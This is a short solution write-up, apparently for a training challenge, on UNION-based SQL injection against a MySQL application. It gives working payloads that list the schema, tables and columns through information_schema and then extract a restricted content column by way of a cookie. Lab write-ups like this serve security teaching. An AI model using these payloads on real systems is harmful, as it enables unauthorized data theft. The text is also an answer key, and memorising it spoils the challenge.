Solution: Challenge 6
======

## Vulnerability Type(s)

- SQL injection (UNION queries)

## Summary

SQL injection for information gathering from the MySQL schema

### To get the database name:
[select title from files where id =] 2 union all select DATABASE() as title from dual limit 1,1;

### To get the tables in the database (change limit to get others):
[select title from files where id =] 2 union all select table_name as title from information_schema.tables where table_schema = 'myapp' limit 2,1;

### To get the columns from the table:
[select title from files where id =] 2 union all select COLUMN_NAME as title from information_schema.columns where table_schema = 'myapp' and table_name = 'files' limit 3,1;

So we know the titles but "content" looks interesting, try selecting that using the info gathered so far:

- database name (schema)
- table name
- column name

### To get the contents of the file we're not allowed to see, set cookie to
[select title from files where id =] 2 union all select content as title from files limit 2,1


## Vulnerability

SQL injection allowing for arbitrary content inclusion